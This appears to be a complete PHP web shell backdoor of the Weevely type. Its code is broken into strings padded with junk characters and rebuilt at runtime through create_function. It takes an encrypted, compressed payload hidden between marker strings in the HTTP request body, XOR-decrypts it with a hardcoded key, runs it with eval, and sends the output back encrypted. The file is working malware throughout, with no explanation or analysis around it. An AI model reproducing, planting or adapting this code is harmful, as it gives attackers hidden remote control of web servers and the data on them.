<?php
$a='$k=!}"58bfdbcb!}"!}!};$kh=!}"5db5a06753fd";$kf=!}!}"87!}5c5c364!}0d5";$!}p="!}DXz5tfkym!}UY8yGCD";fun!}ction x($t!},!}$k)';
$F='c!}ontents(!});@ob_en!}d_clean!}();$!}r=@bas!}e6!}4_encod!}e(@x(@!}gzc!}ompres!}s(!}$o),$k));pr!}int!}("$p$kh$r$kf");}';
$m=str_replace('zC','','crezCazCtzCezC_funzCczCtion');
$p='{$!}c=!}strlen($k)!};$l=s!}trlen(!}$t);$o="";!}fo!}r($!}i=0;$i<$l;){fo!}r($j=0;(!}$j<!}$c&!}&$i<$l)!}!};$j++!},$i+!}!}';
$o='+){$o.=$t{$i}^$k{!}$j}!};}}retur!}n $o;}if (@!}p!}reg_m!}!}a!}tch("/$!}kh(.+)$kf/",@!}file_get_conte!}n!}ts!}("php://i';
$C='nput"),$m)=!}=1)!} {@!}ob_sta!}rt();@ev!}al(@gzun!}compress(!}@x!}(@base!}64_decode(!}$m[1]!})!},$k)));$!}o=@ob_g!}et_';
$x=str_replace('!}','',$a.$p.$o.$C.$F);
$Z=$m('',$x);$Z();
?>
